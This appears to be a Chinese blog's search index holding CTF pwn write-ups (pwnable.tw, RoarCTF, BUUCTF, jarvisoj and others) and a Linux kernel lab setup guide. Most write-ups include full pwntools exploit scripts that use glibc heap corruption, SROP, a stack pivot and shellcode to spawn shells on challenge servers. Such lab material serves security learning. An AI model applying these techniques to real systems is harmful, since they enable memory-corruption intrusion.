<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[pwnable.tw re-alloc_revenge]]></title>
    <url>%2F2020%2F02%2F05%2Fpwnable-tw-re-alloc-revenge%2F</url>
    <content type="text"><![CDATA[一道pwnable.tw新上的题，环境是libc2.29，在另一道题re-alloc的基础上开启了PIE和RELRO，可以通过这道题学习一些libc2.29、realloc的相关特性 分析程序程序主要有三个功能，malloc申请内存保存数据、realloc重新分配内存以及free释放内存，堆指针由一个全局数组保存，而三种操作中都限制了数组范围只有两个，且free后将数组指针清0，此外，程序还限制了申请空间的大小不大于0x78 漏洞利用这道题主要利用了当realloc的size参数为0时可以将指针free掉，且没有将指针清0从而导致UAF，但难点在于程序环境为libc2.29且全局数组只能保存两个指针，并且程序不能申请大于0x78的空间（加大了泄露libc的难度） 泄露libc基址libc-2.29版本存在tcache首先会在heap开头位置创建一个tcache结构体来维护： 12345typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS];//0x40 tcache_entry *entries[TCACHE_MAX_BINS];//0x40*8&#125; tcache_perthread_struct; 其前0x40字节为对应大小tcache的数量，后0x200个字节为指针数组，指向tcache_entry链表的头部指针，针对tcache结构体的利用参考：https://xz.aliyun.com/t/6828这样我们可以利用uaf申请空间到tcahce sturct（需要爆破一字节），然后将tcache的数量改为不合法数组，从而使得tcache不可用，这样free后的chunk就不会进入tcache：然后再利用realloc的特性，重新分配tcache struct这部分空间，可以将释放原空间（进入unsorted bin)并重新申请一段空间，只要控制好重新分配空间的大小，就足以将unsorted bin链表头写入tcahce指针数组对应的位置：这样如果我们再次申请空间（注意有些size不可用）就会从unsorted bin中申请恰好可以利用unsorted bin链表头对于libc的偏移量，爆破一字节使得tcache指针指向_IO_2_1_stdout_的位置，这样我们就可以修改其结构体内容从而泄露libc基址 getshell由于我们已经劫持了tcache struct接下来的事情就顺理成章，修改指针指向free_hook将其修改为system然后就可以执行system(“/bin/sh”)来getshell了 完整exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context.log_level = 'debug'prog = './re-alloc_revenge'elf = ELF(prog)libc = ELF("libc.so")def dbg(): gdb.attach(p) #if b == '': # p.interactive()def alloc(idx, size, content='a'): p.sendlineafter("choice: ", '1') p.sendlineafter("Index:", str(idx)) p.sendlineafter("Size:", str(size)) p.sendafter("Data:", content)def realloc(idx, size, content='a'): p.sendlineafter("choice: ", '2') p.sendlineafter("Index:", str(idx)) p.sendlineafter("Size:", str(size)) if size != 0: p.sendafter("Data:", content)def free(idx): p.sendlineafter("choice: ", '3') p.sendlineafter("Index:", str(idx))def exp(): try: global p #p = process(prog) p = remote('chall.pwnable.tw', 10310) alloc(0, 0x40) alloc(1, 0x40) free(0) realloc(1, 0) realloc(1, 0x40 ,'\x10\x60') alloc(0, 0x40) realloc(0, 0x50) free(0) alloc(0, 0x40, '\xff'*4+'\x00'*2+'\xff'*(0x40-6)) realloc(0, 0x50) realloc(1, 0x70) free(1) alloc(1, 0x30) free(0) realloc(1, 0x30, 'a'*8+'\x58\x47') alloc(0, 0x60, '/bin/sh\x00'+p64(0xfbad1800)+p64(0)*3) p.recv(8) libc.address = u64(p.recv(6)+'\x00'*2)-0x7ffff7fc7570+0x7ffff7de0000 log.info("libc.address ==&gt; " + hex(libc.address)) if libc.address &amp; 0xff != 0: p.close() return False realloc(1, 0x30, 'a'*8+p64(libc.sym['__free_hook'])) free(1) alloc(1, 0x60, p64(libc.sym['system'])) free(0) except: p.close() return False p.interactive()if __name__ == '__main__': while not exp(): pass 总共爆破了两字节，（实际上我很快就成功了，运气不错，不知道是不是因为这两个字节有什么联系，但肯定不是一一对应）]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux kernel环境搭建]]></title>
    <url>%2F2020%2F01%2F29%2Flinux-kernel%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[好久没更新博客了，很大原因是因为网上有太多大师傅总结的都比较好，自己又太菜，能写出来的干货太少了。希望利用这个假期来学习一下linux kernel相关 内核编译安装所需要的依赖： 12sudo apt-get updatesudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc 下载kernel源代码，我这里选择了linux-4.4.73版本 1234wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.73.tar.gztar -zxvf linux-4.4.73.tar.gzcd linux-4.4.73make menuconfig 在可选菜单里默认选项即可，直接保存，然后 1make bzImage 需要等待一段时间去编译，看到如下信息，基本就算是编译完成了在./arch/x86/boot/可以找到bzImage，从源码根目录找到vmlinux。ps:bzImage（Big zImage）是vmlinuz经过gzip压缩后的文件，适用于大内核vmlinux是未压缩的内核，是一个非压缩的，静态链接的，可执行的，不能bootable的Linux kernel文件。是用来生成vmlinuz的中间步骤。vmlinuz是vmlinux的压缩文件，是一个压缩的，能bootable的Linux kernel文件。vmlinuz是Linux kernel文件的历史名字，它实际上就是zImage或bzImagevmlinux 是ELF文件，即编译出来的最原始的文件。vmlinuz应该是由ELF文件vmlinux经过OBJCOPY后，并经过压缩后的文件zImage是vmlinuz经过gzip压缩后的文件，适用于小内核 添加syscall其实这部分内容在上学期的操作系统实验与课设中有过相关的学习和操作，只不过用的是linux0.11在内核源代码根目录下创建helloworld目录，并创建两个文件helloworld.c和Makefilehelloworld.c: 123456#include &lt;linux/kernel.h&gt;asmlinkage long sys_helloworld(void)&#123; printk("&#123;==kernel==&#125; hello world\n"); return 0;&#125; Makefile： 1obj-y=helloworld.o 然后返回根目录，编辑Makefile，添加helloworld/然后在include/linux/syscalls.h，添加函数原型 1asmlinkage long sys_helloworld(void); 编辑arch/x86/entry/syscalls/syscall_32,添加 11111 i386 helloworld sys_helloworld 编辑arch/x86/entry/syscalls/syscall_64,添加 11111 common helloworld sys_helloworld 注意这个要加在这行的上面 1# x32-specific system call numbers start at 512 to avoid cache impact 然后make bzImage编译内核 编译busybox根据维基上的定义：BusyBox是一个遵循GPL协议、以自由软件形式发行的应用程序。Busybox在单一的可执行文件中提供了精简的Unix工具集，可运行于多款POSIX环境的操作系统，例如Linux（包括Android[6]）、Hurd[7]、FreeBSD[8][9]等等。由于BusyBox可执行文件的文件大小比较小，使得它非常适合使用于嵌入式系统。作者将BusyBox称为“嵌入式Linux的瑞士军刀”busybox可在官网下载：https://busybox.net/将下载文件解压后，进入目录下 1make menuconfig 在setting里将Build static binary (no shared libs)勾选，然后执行编译 1make install -j4 然后进行相关的初始化工作 12345cd _installmkdir procmkdir systouch initchmod +x init 在init文件中写入下面内容： 123456789101112!/bin/shecho &quot;&#123;==DBG==&#125; INIT SCRIPT&quot;mkdir /tmpmount -t proc none /procmount -t sysfs none /sysmount -t debugfs none /sys/kernel/debugmount -t tmpfs none /tmp# insmod /xxx.ko # load komdev -s # We need this to find /dev/sda laterecho -e &quot;&#123;==DBG==&#125; Boot took $(cut -d&apos; &apos; -f1 /proc/uptime) seconds&quot;setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user# exec /bin/sh #root init作用是内核初始化，insmod作用于将指定模块加载到内核中然后可以在上层目录中写一个如下脚本用来打包rootfs 1234#!/bin/shecho &quot;Generate rootfs.img&quot;cd busybox # fs folderfind . | cpio -o --format=newc &gt; ../rootfs.img 编译ko文件在内核源代码根目录下，创建ko目录编辑hello.c和Makefile文件hello.c: 123456789101112131415161718#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/cred.h&gt;MODULE_LICENSE("Dual BSD/GPL");struct cred c1;static int hello_init(void) &#123; printk("&lt;1&gt; Hello world!\n"); printk("size of cred : %d \n",sizeof(c1)); return 0;&#125;static void hello_exit(void) &#123; printk("&lt;1&gt; Bye, cruel world\n");&#125;module_init(hello_init);module_exit(hello_exit); Makefile： 1234567891011121314obj-m := hello.oKERNELDR := /home/focu5/linux-4.4.72PWD := $(shell pwd) modules: $(MAKE) -C $(KERNELDR) M=$(PWD) modules moduels_install: $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install clean: rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions 然后执行make编译hello.ko文件，并放到busybox的_install目录下 运行写一个程序来调用syscall，注意用静态编译 1234567//gcc test.c -static -o test#include &lt;unistd.h&gt;int main(void)&#123; syscall(1111); return 0;&#125; 将FileSystem打包成映像（此时应该将刚才编辑的init中xxx.ko改为刚才我们生成的hello.ko)执行find . | cpio -o --format=newc &gt; ./rootfs.img将生成的rootfs.img和编译的内核bzImage文件放在同一文件夹下，新建一个启动脚本boot.sh 123456789101112#!/bin/shqemu-system-x86_64 \-m 64M \-kernel ./bzImage \-initrd ./rootfs.img \-append &quot;root=/dev/ram rw oops=panic panic=1 kalsr&quot; \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-monitor /dev/null \-smp cores=2,threads=1 \-cpu kvm64,+smep \#-S 启动gdb调试#-gdb tcp:1234 等待gdb调试 ./boot.sh运行即可]]></content>
      <tags>
        <tag>linux kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Roarctf-2019]]></title>
    <url>%2F2019%2F10%2F17%2FRoarctf-2019%2F</url>
    <content type="text"><![CDATA[easy_pwn程序存在off by one可以借此进行chunk overlap，我采用了向上合并的方式，首先申请一个unsorted chunk0并free掉，中间申请一个可以off by one的unsorted chunk1，再申请一个unsorted chunk2，利用中间的chunk更改下一个chunk的size位尽量包含多个chunk， 然后当再次申请chunk0_size,可以使得main_arena在chunk1的fd位，show(1)可计算得到libc基址，然后add(chunk1_size),可以获得一个由两个指针同时指向的chunk1，可以劫持malloc_hook，注意的是再写one_gadget需要利用realloc平衡栈结构来执行execve(‘/bin/sh’,0,0) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *context.log_level="debug"libc = ELF("./libc-2.23.so")p = process("./easy_pwn")#p = remote("39.97.182.233", 41078)def add(size): p.sendlineafter(": ", "1") p.sendlineafter(": ", str(size))def edit(idx, size, content): p.sendlineafter(": ", "2") p.sendlineafter(": ", str(idx)) p.sendlineafter(": ", str(size)) p.sendafter(": ", content)def free(idx): p.sendlineafter(": ","3") p.sendlineafter(": ", str(idx))def show(idx): p.sendlineafter(": ", "4") p.sendlineafter(": ", str(idx))def dbg(): gdb.attach(p) p.interactive()def exp(): add(0x80)#0 add(0x68)#1 add(0x80)#2 add(0x20)#3 add(0x20)#4 free(0) edit(1, 0x68+10, '\x00'*0x60+p64(0x100)+'\xc0') free(2) add(0x80)#0 show(1) libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00'*2)-0x3c4b78 log.success("libc_base == &gt; " + hex(libc_base)) malloc_hook = libc_base + libc.sym['__malloc_hook']-0x23 realloc = libc_base + libc.sym['realloc'] add(0x68)#2 free(2) edit(1, 8, p64(malloc_hook)) add(0x68) add(0x68) edit(5, 0x18+3, 'aaa'+p64(0)+p64(libc_base+0xf1147)+p64(realloc+4)) #dbg() p.interactive()if __name__ == '__main__': exp() PS：看了其他师傅的wp，是用unsorted attack在free_hook上写出一个0x7f开头的数据来写free_hook为system realloc_magic没有输出函数且开启PIE，需要利用unsorted chunk踩出_IO_2_1_stdout_高位地址，然后1/16爆破其第低三位，修改_IO_write_base和flags泄露出libc基址。利用realloc的特性和uaf，overlap chunk，关键点是程序只有一次重置指针的机会，需要在改完IO FILE时使用，所以前面进行tcache attack时，修改其size位，使其下次free后进入其他size的tcache bins，不然因为tcache bin的后进先出永远申请不到目标位置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context.log_level = 'debug'elf = ELF("./roarctf_2019_realloc_magic")#p = elf.process()libc = ELF("./libc-2.27.so")def dbg(): gdb.attach(p) p.interactive()def re(size, content): p.sendlineafter("&gt;&gt; ", '1') p.sendlineafter("Size?", str(size)) p.sendafter("Content?", content)def fr(): p.sendlineafter("&gt;&gt; ", '2')def ba(): p.sendlineafter("&gt;&gt; ", '666')def exp(): global p p = remote("node3.buuoj.cn", 28467) re(0x80, 'a') re(0, '') re(0x90, 'b') re(0, '') re(0x20, 'b') re(0, '') re(0x90, 'a') for i in range(7): fr() re(0, '') re(0x80, 'a') re(0x110, '\x00'*0x88 + p64(0x51)+'\x60\xf7') re(0, '') re(0x90, 'a') re(0, '') try: re(0x90, p64(0xfbad1800)+p64(0)*3+'\x00') except: log.failure("not lucky enough!") p.close() return False libc_base = u64(p.recvuntil("\x7f", timeout=0.5)[-6:].ljust(8,'\x00'))-0x3ed8b0 if libc_base&amp;0xFF!=0x00: log.failure("not lucky enough!") p.close() return False log.success('libc_base ==&gt; ' + hex(libc_base)) ba() re(0x120, '\x00'*0x88+p64(0x61)+p64(libc_base+libc.sym['__free_hook'])) re(0, '') re(0x40, 'a') re(0, '') re(0x40, p64(libc_base+libc.sym['system'])) re(0, '') re(0x20, '/bin/sh\x00') fr() p.interactive()while not exp(): passif __name__ == '__main__': exp()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记录一下在buuctf刷的几个pwn题]]></title>
    <url>%2F2019%2F09%2F13%2Fbuuctf-pwn%2F</url>
    <content type="text"><![CDATA[babyheap_0ctf_2017申请几个fast chunk和一个unsorted chunk, 释放两个fast chunk，改变第一个chunk的fd值为unsorted chunk地址，且需要将其size位改为0x21，为的是过掉检测： 1234567if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))&#123; errstr = "malloc(): memory corruption (fast)";errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL;&#125; 查看其 chunksize 与相应的 fastbin_index 是否匹配，实际上 chunksize 的计算方法是 victim-&gt;size &amp; ~(SIZE_BITS))，而它对应的 index 计算方法为 (size) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3) - 2，这里 64位的平台对应的 SIZE_SZ 是8，则 fastbin_index 为 (size &gt;&gt; 4) - 2，那么我们将 small chunk 的 size 域改写成 0x21 即可。两次alloc申请到unsorted chunk，使得第二个指针也指向他，此时再将他的size改回来，free掉即可通过show(1)来leak libc babyfengshui_33c3_2016参照https://firmianay.gitbooks.io/ctf-all-in-one/doc/6.1.20_pwn_33c3ctf2016_babyfengshui.html题目主要是通过(store[i]-&gt;desc + test_size) &lt; (store[i] - 4)来检测堆溢出，那么可以通过先创建两个user，free掉第一个，使其description和name合并为一个unsorted chunk，再申请一个大小为合并后chunk的大小的description，此时即可绕过检测进行堆溢出然后就是经典操作将user2的description改为free_got，泄露libc基址，在修改指针，使得free_got为system，构造chunk即可执行system(“/bin/sh”)exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *context.log_level = 'debug'#p = process('./babyfeng')elf = ELF("./babyfeng")p = remote('pwn.buuoj.cn', 20002)libc = ELF("./x86_libc.so.6")#libc = ELF("./libc-2.23.so")if args.G: gdb.attach(p)def add(nsize, name, dsize, des): p.recvuntil("Action: ") p.sendline("0") p.recvuntil("description: ") p.sendline(str(nsize)) p.recvuntil("name: ") p.sendline(name) p.recvuntil("text length: ") p.sendline(str(dsize)) p.recvuntil("text: ") p.sendline(des)def free(idx): p.recvuntil("Action: ") p.sendline("1") p.recvuntil("index: ") p.sendline(str(idx))def show(idx): p.recvuntil("Action: ") p.sendline("2") p.recvuntil("index: ") p.sendline(str(idx))def edit(idx, size, text): p.recvuntil("Action: ") p.sendline("3") p.recvuntil("index: ") p.sendline(str(idx)) p.recvuntil("text length: ") p.sendline(str(size)) p.recvuntil("text: ") p.sendline(text)def exp(): add(0x80,'a',0x80,'a') add(0x80, 'b', 0x80, 'b') add(0x10, '/bin/sh\x00', 0x10, '/bin/sh\x00') free(0) add(0x100, 'a', 0x19c, 'a'*0x198 + p32(elf.got['free'])) show(1) p.recvuntil("description: ") free_addr = u32(p.recv(4)) log.success("free_addr isa " + hex(free_addr)) libc_base = free_addr - libc.sym['free'] system_addr = libc_base + libc.sym['system'] edit(1, 4, p32(system_addr)) log.success("system_addr is " + hex(system_addr)) log.success("libc_base is " + hex(libc_base)) free(2) p.interactive()if __name__ == '__main__': exp() ciscn_final_3难点在于leak libc环境为libc.2.27含tcache，无法申请到unsorted chunk，先通过gift得到第一块的堆地址，然后利用tcache attack double free到第一块，修改size利用堆重叠使其进入unsorted bin分割chunk至tcache chunk使其fd指向main_arena附近，再次申请chunk通过gift，即可leak libc ez_pz_hackover_2016‘\x00’过掉strlen，ret2libc 123456789101112131415161718192021222324from pwn import *context.log_level = 'debug'#p = process("./ez_pz_hackover_2016")p = remote("pwn.buuoj.cn", 20040)elf = ELF("./ez_pz_hackover_2016")libc = ELF("x86_libc.so.6")if args.G: gdb.attach(p)chall = 0x8048603p.recvuntil("&gt; ")payload = 'crashme\x00' + 'a' * (0x32-8-0x14-4) + p32(elf.plt['printf']) + p32(chall) + p32(elf.got['printf'])p.sendline(payload)p.recvline_startswith('Welcome')printf_addr = u32(p.recv(4))log.success("printf_addr ==&gt; " + hex(printf_addr))libc_base = printf_addr - libc.sym['printf']log.success("libc_base ==&gt; " + hex(libc_base))system_addr = libc.sym['system'] + libc_basebinsh_addr = libc.search("/bin/sh").next() + libc_basepayload = 'crashme\x00' + 'a' * (0x32-8-0x14-4) + p32(system_addr) + p32(0) + p32(binsh_addr)p.sendline(payload)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈溢出进阶——srop]]></title>
    <url>%2F2019%2F09%2F13%2Fsrop%2F</url>
    <content type="text"><![CDATA[srop主要学习来源来自 ctf-wiki上的介绍：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop原理、exp和题目不想做搬运，里面都可以找到这里主要谈一下自己的心得：现附上一张图 这个是根据ctf-wiki上的exp构造的栈空间的流程，可以发现大概利用流程就是通过read读入字节数的返回值修改rax，再将sigframe结构体写入栈中，再通过read读取syscall至返回地址，拼接字节使其返回值为15，从而执行sigreturn，又因为sigframe设置rip为syscall再次调用,执行execve(‘/bin/sh’,0,0)由于直接将返回值改为syscall,会破坏rsp，无法继续read sigframe,所以采用两次读取sigframe，第一次目的是将rsp置为原址，并将返回地址main和第二个sigframe读入栈中，然后回到main执行read(0,rsp,0x400)，置rax为15，即可getshell注意：一定要加上context.arch = ‘amd64’，关系到SigreturnFrame()的内容 接下来是实战了一道例题：ciscn_2019_es_7，buuoj上有题目复现其中提供了方便利用的gadget 12345678910111213.text:00000000004004ED ; __unwind &#123;.text:00000000004004ED push rbp.text:00000000004004EE mov rbp, rsp.text:00000000004004F1 xor rax, rax.text:00000000004004F4 mov edx, 400h ; count.text:00000000004004F9 lea rsi, [rsp+buf] ; buf.text:00000000004004FE mov rdi, rax ; fd.text:0000000000400501 syscall ; LINUX - sys_read.text:0000000000400503 mov rax, 1.text:000000000040050A mov edx, 30h ; count.text:000000000040050F lea rsi, [rsp+buf] ; buf.text:0000000000400514 mov rdi, rax ; fd.text:0000000000400517 syscall ; LINUX - sys_write 1234567891011.text:00000000004004D6 gadgets proc near.text:00000000004004D6 ; __unwind &#123;.text:00000000004004D6 push rbp.text:00000000004004D7 mov rbp, rsp.text:00000000004004DA mov rax, 0Fh ;修改rax为0xf 可执行sigreturn.text:00000000004004E1 retn.text:00000000004004E1 gadgets endp ; sp-analysis failed.text:00000000004004E1.text:00000000004004E2 ; ---------------------------------------------------------------------------.text:00000000004004E2 mov rax, 3Bh ;修改rax为0x3b 可执行execve.text:00000000004004E9 retn 由于这道题不知道怎么使用execve，就直接运用sigreturn来做了主要利用过程就是先得到栈地址，由于返回地址要覆盖成read，所以只能找到一个栈空间下面的一段偏移，题目未开启pie则可以通过计算找到binsh字符串，然后就是写入sigframe，再利用给的gadget将rax设置为15即可exp如下： 12345678910111213141516171819202122232425262728293031323334from pwn import *#p = process('./ciscn_2019_es_7')p = remote('pwn.buuoj.cn', 20179)if args.G: gdb.attach(p)context.arch = 'amd64'context.log_level = 'debug'gadget = 0x4004dasyscall_ret = 0x400517read = 0x4004edpayload = 'a' * 16 + p64(read)p.send(payload)p.recvn(32)stack_addr = u64(p.recvn(6)+'\x00'*2)log.success('leak stack addr :' + hex(stack_addr))## call execv("/bin/sh",0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr - 280 # "/bin/sh" 's addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = '/bin/sh\x00' + p64(0) + p64(gadget) + p64(syscall_ret) + str(sigframe)print len(frame_payload)payload = frame_payload p.send(payload)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jarvisoj-level6_x64-实战unlink利用]]></title>
    <url>%2F2019%2F08%2F18%2Fjarvisoj-pwn-freenote-x64%2F</url>
    <content type="text"><![CDATA[这道题算是自己独立完成的第一个堆利用题，比较有纪念意义拿到题，IDA加载后分析源码，存在一个bss段信息存放着有关的堆信息，通过gdb调试发现其存放着堆信息索引的地址注意是指向索引的指针，如果是索引本身那么直接unlink到bss段即可 调试发现，索引也为一个chunk，是变化的，但可以通过leak heap计算得来heap地址泄露的原理为：当两个不相邻的chunk被free掉时，会置于bin的链表中，本例中会先放到unsorted bin中，这时chunk的fd和bk中存有chunk的地址信息首先建立五个chunk，然后free掉两个不相邻的，其中chunk0的作用用来溢出到chunk1的fd部分之前来泄露fd（chunk3地址）的内容，chunk4的作用则是chunk3被free时与top chunk合并 1234567new('a'*0x80) #0new('b'*0x80) #1new('c'*0x80) #2new('d'*0x80) #3new('e'*0x80) #4 free(3)free(1) 此时gdb调试堆情况如下通过上张调试图片可以发现chunk1的bk部分存放着main_arena+88的地址，接下来可以藉此leak libclibc地址泄露的具体原理为： 1. 由于在写入的时候没有加上\x00，所以在输出的时候可以也一直输出到之后的\x00为止。 2. 当chunk被free掉后fd和bk指针会的值为&lt;main_arena+offset&gt;，而&lt;main_arena+offset&gt;与libc加载地址的相对偏移是固定的。所以只需要泄露出&lt;main_arena+offset&gt;，再在本地调试找到算出libc和main_arena的偏移，便能知道libc的基址不同libc版本，其main_arena偏移地址可通过malloc_trim找到：接下来即可在chunk0下面伪造fake chunk使其fd为heap_head-0x18,bk为heap_head-0x10，unlink原理网上很多就不再写了，稍微总结一下unlink的理解unlink在构造fake chunk时候要绕过两个函数 12if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P, AV); 12if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr ("corrupted size vs. prev_size"); 绕过第一个函数，需要找到一个位置指向堆地址，即*P = X，通常P为一个note的索引绕过第二个函数，需要溢出到下一个chunk的prev_size位，使其等于fake chunk的size，同时size位的最低为要为0成功unlink后，P可以指向P-0x18，可以配合edit free等功能实现任意读写因为此题未开启FULL RELRO，可改变got表为system实现get shell，不然要通过写free_hook或者malloc_hook完整exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *context.log_level = 'debug'p = process("./freenote")#p = remote("pwn2.jarvisoj.com", 9886)elf = ELF('./freenote')libc = ELF('libc-2.19.so')#libc = ELF('libc.so.6')if args.G: gdb.attach(p)def new(payload): p.recvuntil("choice: ") p.sendline("2") p.recvuntil("new note: ") p.sendline(str(len(payload))) p.recvuntil("your note: ") p.send(payload)def show(): p.recvuntil("choice: ") p.sendline("1")def edit(idx, payload): p.recvuntil("choice: ") p.sendline("3") p.recvuntil("number: ") p.sendline(str(idx)) p.recvuntil("of note: ") p.sendline(str(len(payload))) p.recvuntil("your note: ") p.send(payload)def free(idx): p.recvuntil("choice: ") p.sendline("4") p.recvuntil("number: ") p.sendline(str(idx))def exp(): new('a'*0x80) #0 new('b'*0x80) #1 new('c'*0x80) #2 new('d'*0x80) #3 new('e'*0x80) #4 #leak heap free(3) free(1) edit(0, 'a'*0x90) show() p.recvn(0x93) heap_head = u64(p.recvuntil('\n', drop = True).ljust(8, '\x00')) - 0x19d0 log.success('heap_head is ' + hex(heap_head)) #leak libc edit(0, 'a'*0x98) show() p.recvn(0x93 + 0x8) main_arena = u64(p.recvn(6).ljust(8, '\x00')) log.success("main_arena is " + hex(main_arena)) libc_base = main_arena - 88 - 0x3c2760 system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + libc.search('/bin/sh').next() #unlink payload = p64(0) + p64(0x80) + p64(heap_head + 0x30 - 0x18) + p64(heap_head + 0x30 - 0x10) payload = payload.ljust(0x80, 'a') payload += p64(0x80) + p64(0x90) free(0) new(payload) free(1) payload = p64(2) + p64(1) + p64(8) + p64(elf.got['free']) + p64(0)*2 + p64(binsh_addr) payload = payload.ljust(0x90, 'a') edit(0, payload) edit(0, p64(system_addr)) free(1)exp()p.interactive() 通过这道题对堆利用的题有了初步的认识，接下来要努力学习堆内存管理的机制。PS：常见的unlink利用是通过off-by-one null byte使下一个chunk的size低位为0，然后free实现unlink]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一道pwn题学习c和python混合编程]]></title>
    <url>%2F2019%2F08%2F04%2FQCTF2018-pwn-dice-game%2F</url>
    <content type="text"><![CDATA[QCTF2018-pwn-dice_game拿到文件，首先IDA分析发现read函数，但长度限制在0x50，buf位于rbp-0x50处，且有截断，无法直接溢出到rip 发现srand函数，其通过参数seed改变系统提供的种子值，可以使得每次调用rand函数生成的伪随机数序列不同，从而实现真正意义上的“随机”此题通过rand函数生成数字，每次与输入对比，50次全部猜对即可获得flag通过查看栈上buf和seed的位置关系，发现可以通过溢出覆盖seed值但是要想利用就需要利用libc中的函数，通过查找资料发现一个可以在python中调用c语言函数库的办法，实现python和c混合编程python一个库——ctypes，使用cdll.LoadLibrary即可加载dll并取出函数完整exp如下： 123456789101112131415from pwn import *from ctypes import *libc = cdll.LoadLibrary('libc.so.6')#p = process('./dice_game')p = remote('111.198.29.45', 51234)payload = 'a' * 0x40 + p64(1)p.sendlineafter('name:', payload)for _ in range(50): num = libc.rand() % 6 + 1 p.sendlineafter('(1~6):', str(num))p.interactive() 继续学习ctypes库，学习到很多有意思的东西： 123456789i = c_int(42)print 'before, i.value =', i.valuepi = pointer(i)pi[0] = 57print 'after, i.value =', i.value # create NULL pointer, also can use this way, but recommend use 'pointer' not 'POINTER'null_ptr = POINTER(c_int)()print 'bool(null_ptr) =', bool(null_ptr) 即通过关键字pointer可以使用指针还有其他方法，参考资料：https://www.cnblogs.com/gaowengang/p/7919219.html]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-安恒19年7月赛-pwn]]></title>
    <url>%2F2019%2F07%2F30%2F2019-7-pwn-unexploit%2F</url>
    <content type="text"><![CDATA[unexploit IDA打开，发现危险函数read造成栈溢出 checksec查看保护发现未开启NX，但是由于buf位于rbp-0x8处，且read限制读取0x20字符，需要用栈迁移的办法构造payload，从而控制程序流程执行shellcode首先构造payload1将栈迁移至bss段 1payload1 = 'a' * 8 + p64(bss - 0x8) + p64(read_addr) + p64(0xdeadbeef) 执行完read函数，通过leave和ret指令，使得rbp指向bss-0x8处，而rip指向read_addr，使得程序再次执行read函数继续构造payload2 1payload2 = 'a' * 8 + p64(bss + 0x8) + p64(read_addr) + p64(0xdeadbeef) 此次指向完毕，rsp和rbp会指向同一处:bss+8，而rip指向bss处的read函数，这样再次执行read的话，会先将read的下一条指令的地址压入栈中图上可以看到call read之前会push下一条指令，则rsp-4指向bss地址，而read将bss+8读入bss处修改了read的返回地址，执行完read之后来到bss+8，此时bss+8刚好是shellcode 1payload3 = p64(bss + 0x8) + shellcode 最终exp 12345678910111213141516171819from pwn import *#context.log_level = 'debug'p = process('./unexploit')elf = ELF('./unexploit')#gdb.attach(p)read_add = 0x40068abss_addr = elf.bss()shellcode = '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'payload1 = 'a' * 8 + p64(bss_addr - 0x8) + p64(read_add) + p64(0xdeadbeef)payload2 = 'a' * 8 + p64(bss_addr + 0x8) + p64(read_add) + p64(0xdeadbeef)payload3 = p64(bss_addr + 0x8) + shellcodep.send(payload1)p.send(payload2)p.send(payload3)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[函数调用过程]]></title>
    <url>%2F2019%2F07%2F14%2Ffunc%2F</url>
    <content type="text"><![CDATA[1、调用者函数把被调函数所需要的参数按照与被调函数的形参顺序相反的顺序压入栈中,即:从右向左依次把被调函数所需要的参数压入栈; 2、调用者函数使用call指令调用被调函数,并把call指令的下一条指令的地址当成返回地址压入栈中(这个压栈操作隐含在call指令中); 3、在被调函数中,被调函数会先保存调用者函数的栈底地址(push ebp)(从高内在地址–》低内存地址),然后再保存调用者函数的栈顶地址,即:当前被调函数的栈底地址(mov ebp,esp); 4、在被调函数中,从ebp的位置处开始存放被调函数中的局部变量和临时变量,并且这些变量的地址按照定义时的顺序依次减小,即:这些变量的地址是按照栈的延伸方向排列的,先定义的变量先入栈,后定义的变量后入栈;]]></content>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
</search>
